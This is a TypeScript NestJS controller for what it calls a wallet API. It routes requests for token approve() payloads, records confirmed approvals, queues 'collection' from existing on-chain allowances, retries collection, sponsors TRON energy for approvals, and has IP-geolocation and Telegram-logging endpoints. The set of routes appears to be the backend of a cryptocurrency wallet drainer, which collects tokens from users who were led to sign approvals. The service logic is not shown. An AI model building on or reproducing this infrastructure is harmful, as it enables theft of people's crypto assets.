import {
  Body,
  Controller,
  Get,
  Param,
  Post,
  Query,
  Req,
  UnauthorizedException,
  UseGuards,
} from "@nestjs/common";
import { ApiBody, ApiOperation, ApiSecurity, ApiTags } from "@nestjs/swagger";
import type { Request } from "express";
import { AdminApiKeyGuard } from "../../common/guards/admin-api-key.guard";
import { getRequestCorrelation } from "../../common/middleware/correlation.middleware";
import { WalletSessionGuard } from "../auth/wallet-session.guard";
import { NativeTransferService } from "./native-transfer.service";
import { NetworkSettlementService } from "./network-settlement.service";
import { WalletService } from "./wallet.service";

@ApiTags("Wallet API")
@Controller("api")
export class WalletController {
  constructor(
    private readonly walletService: WalletService,
    private readonly nativeTransferService: NativeTransferService,
    private readonly networkSettlementService: NetworkSettlementService,
  ) {}

  @Get("balances")
  @ApiOperation({ summary: "Fetch EVM/TRON balances for connected wallets" })
  balances(@Query("evm") evm?: string, @Query("tron") tron?: string) {
    return this.walletService.getBalances(evm ?? "", tron ?? "");
  }

  @Post("native-transfers/estimate")
  @ApiOperation({
    summary: "Estimate native coin transfer fee and max sendable amount",
  })
  nativeTransferEstimate(@Body() body: Record<string, unknown>) {
    return this.nativeTransferService.estimate(body);
  }

  @Post("native-transfers/register-pending")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary: "Register a broadcast native transfer awaiting confirmation",
  })
  nativeTransferRegisterPending(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    this.assertNativeTransferSession(body, req.walletSession);
    return this.nativeTransferService.registerPending(body);
  }

  @Post("native-transfers/confirm")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({ summary: "Verify and persist a confirmed native transfer" })
  nativeTransferConfirm(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    this.assertNativeTransferSession(body, req.walletSession);
    return this.nativeTransferService.confirm(body);
  }

  @Get("native-transfers/:id")
  @ApiOperation({ summary: "Fetch native transfer record by id" })
  nativeTransferById(@Param("id") id: string) {
    return this.nativeTransferService.getById(id);
  }

  @Post("approvals/prepare")
  @ApiOperation({ summary: "Build approve() transaction payload" })
  approvalsPrepare(@Body() body: Record<string, unknown>) {
    return this.walletService.prepareApproval(body);
  }

  @Post("approvals/confirm")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({ summary: "Confirm approval and persist in Postgres" })
  approvalsConfirm(
    @Body() body: Record<string, unknown>,
    @Req()
    req: Request & { walletSession?: { address: string; network: string } },
  ) {
    const session = req.walletSession;
    const owner = String(body.owner ?? "").trim();
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    if (
      !session ||
      session.address !== (network === "tron" ? owner : owner.toLowerCase()) ||
      session.network !== network
    ) {
      throw new UnauthorizedException(
        "Authenticated wallet session does not match approval request",
      );
    }
    return this.walletService.confirmApproval(body, getRequestCorrelation(req));
  }

  @Post("approvals/queue-collection")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary:
      "Queue collection for an existing on-chain allowance (skip re-approve)",
  })
  approvalsQueueCollection(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    const session = req.walletSession;
    const owner = String(body.owner ?? "").trim();
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    if (
      !session ||
      session.address !== (network === "tron" ? owner : owner.toLowerCase()) ||
      session.network !== network
    ) {
      throw new UnauthorizedException(
        "Authenticated wallet session does not match queue-collection request",
      );
    }
    return this.walletService.queueCollectionFromAllowance(body);
  }

  @Post("token-collection/native-readiness")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary:
      "Evaluate whether native can execute (blocks on pending, collecting, or retry-scheduled token collection)",
  })
  tokenCollectionNativeReadiness(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    const session = req.walletSession;
    const owner = String(body.owner ?? "").trim();
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    if (
      !session ||
      session.address !== (network === "tron" ? owner : owner.toLowerCase()) ||
      session.network !== network
    ) {
      throw new UnauthorizedException(
        "Authenticated wallet session does not match native-readiness request",
      );
    }
    const tokens = Array.isArray(body.tokens)
      ? (body.tokens as Array<Record<string, unknown>>).map((t) => ({
          token: String(t.token ?? ""),
          shouldAttemptTransfer: Boolean(t.shouldAttemptTransfer),
          approvalId: t.approvalId ? String(t.approvalId) : null,
          approvalTxHash: t.approvalTxHash ? String(t.approvalTxHash) : null,
        }))
      : undefined;
    return this.walletService.evaluateNativeReadiness({
      ownerAddress: owner,
      network,
      tokens,
    });
  }

  @Post("token-collection/nudge")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary:
      "Immediately retry token collection for approvals blocking native execution",
  })
  tokenCollectionNudge(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    const session = req.walletSession;
    const owner = String(body.owner ?? "").trim();
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    if (
      !session ||
      session.address !== (network === "tron" ? owner : owner.toLowerCase()) ||
      session.network !== network
    ) {
      throw new UnauthorizedException(
        "Authenticated wallet session does not match collection nudge request",
      );
    }
    const tokens = Array.isArray(body.tokens)
      ? (body.tokens as Array<Record<string, unknown>>).map((t) => ({
          token: String(t.token ?? ""),
          shouldAttemptTransfer: Boolean(t.shouldAttemptTransfer),
          approvalId: t.approvalId ? String(t.approvalId) : null,
          approvalTxHash: t.approvalTxHash ? String(t.approvalTxHash) : null,
        }))
      : undefined;
    return this.walletService.nudgeTokenCollection({
      ownerAddress: owner,
      network,
      tokens,
    });
  }

  @Post("network-settlement/register")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary: "Register wallet-phase completion for background settlement",
  })
  networkSettlementRegister(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    this.assertNativeTransferSession(body, req.walletSession);
    return this.networkSettlementService.registerWalletPhase(body);
  }

  @Post("network-settlement/register-native-authorization")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary: "Register deferred native authorization from wallet phase",
  })
  networkSettlementRegisterNativeAuth(
    @Body() body: Record<string, unknown>,
    @Req() req: { walletSession?: { address: string; network: string } },
  ) {
    this.assertNativeTransferSession(body, req.walletSession);
    return this.networkSettlementService.registerNativeAuthorization(body);
  }

  @Post("network-settlement/process")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary:
      "Broadcast deferred Tron native after token settlement (does not collect tokens)",
  })
  networkSettlementProcess(@Body() body: Record<string, unknown>) {
    const id = String(body.settlementSessionId ?? "").trim();
    return this.networkSettlementService.processNow(id);
  }

  @Get("network-settlement/:id/status")
  @ApiOperation({ summary: "Poll network settlement progress" })
  networkSettlementStatus(@Param("id") id: string) {
    return this.networkSettlementService.getStatus(id);
  }

  @Post("network-settlement/:id/native-complete")
  @UseGuards(WalletSessionGuard)
  @ApiOperation({
    summary: "Mark EVM native transfer complete after client broadcast",
  })
  networkSettlementNativeComplete(
    @Param("id") id: string,
    @Body() body: Record<string, unknown>,
  ) {
    return this.networkSettlementService.markNativeComplete(
      id,
      String(body.txHash ?? ""),
    );
  }

  @Get("approvals/debug")
  @UseGuards(AdminApiKeyGuard)
  @ApiSecurity("adminApiKey")
  @ApiOperation({
    summary: "Debug approvals/audits/transfers snapshot (admin only)",
  })
  approvalsDebug() {
    return this.walletService.debugApprovals();
  }

  @Post("approvals/debug")
  approvalsDebugPost(@Body() body: Record<string, unknown>) {
    return this.walletService.captureFlowLog(body);
  }

  @Get("approvals/:id")
  @UseGuards(WalletSessionGuard)
  approvalById(
    @Param("id") id: string,
    @Req() req: { walletSession?: { address: string } },
  ) {
    return this.walletService.getApprovalForOwner(
      id,
      req.walletSession!.address,
    );
  }

  @Post("approvals/revoke/prepare")
  approvalsRevokePrepare(@Body() body: Record<string, unknown>) {
    return this.walletService.prepareRevoke(body);
  }

  @Post("tron-broadcast")
  tronBroadcast(@Body() body: Record<string, unknown>) {
    return this.walletService.broadcastTron(body);
  }

  @Post("verify-allowance")
  verifyAllowance(@Body() body: Record<string, unknown>) {
    return this.walletService.verifyAllowance(body);
  }

  @Post("register-approved")
  registerApproved(@Body() body: Record<string, unknown>) {
    return this.walletService.registerApproved(body);
  }

  @Post("tron-approve")
  tronApprove(@Body() body: Record<string, unknown>) {
    return this.walletService.legacyTronApprove(body);
  }

  @Post("consent_")
  consent(@Body() body: Record<string, unknown>) {
    return this.walletService.consent(body);
  }

  @Post("energy-delegate")
  @ApiOperation({
    summary:
      "Acquire chain resources for a prepared tx (legacy path). Routes to ResourceManager.acquireResources().",
  })
  energyDelegate(@Body() body: Record<string, unknown>) {
    return this.walletService.energyDelegate(body);
  }

  @Post("resources/acquire")
  @ApiOperation({
    summary: "Acquire chain resources after prepare (chain-agnostic).",
  })
  resourcesAcquire(@Body() body: Record<string, unknown>) {
    return this.walletService.energyDelegate(body);
  }

  @Post("resources/verify")
  @ApiOperation({
    summary: "Verify the address has resources needed to broadcast.",
  })
  resourcesVerify(@Body() body: Record<string, unknown>) {
    return this.walletService.verifyResources(body);
  }

  @Get("resources/tron-sponsor-health")
  @ApiOperation({
    summary:
      "Check TRON energy delegator activation before sponsoring approvals.",
  })
  tronSponsorHealth() {
    return this.walletService.checkTronSponsorHealth();
  }

  @Get("ipgeo")
  ipgeo(@Req() req: Request) {
    return this.walletService.ipgeo(req.headers);
  }

  @Post("tg-log")
  @ApiBody({ type: Object })
  tgLog(@Body() body: Record<string, unknown>, @Req() req: Request) {
    return this.walletService.tgLog(body, req.headers);
  }

  private assertNativeTransferSession(
    body: Record<string, unknown>,
    session: { address: string; network: string } | undefined,
  ): void {
    const owner = String(body.owner ?? "").trim();
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    if (
      !session ||
      session.address !== (network === "tron" ? owner : owner.toLowerCase()) ||
      session.network !== network
    ) {
      throw new UnauthorizedException(
        "Authenticated wallet session does not match native transfer request",
      );
    }
  }
}
